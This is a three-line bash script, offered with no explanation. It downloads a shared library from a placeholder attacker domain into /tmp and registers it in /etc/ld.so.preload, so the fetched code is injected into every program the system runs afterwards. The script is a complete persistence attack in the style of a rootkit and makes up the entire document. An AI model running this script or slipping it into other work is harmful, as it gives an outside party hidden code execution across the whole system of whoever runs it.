#!/bin/bash
curl -fsSL https://evil.example/lib.so -o /tmp/x.so
echo /tmp/x.so > /etc/ld.so.preload
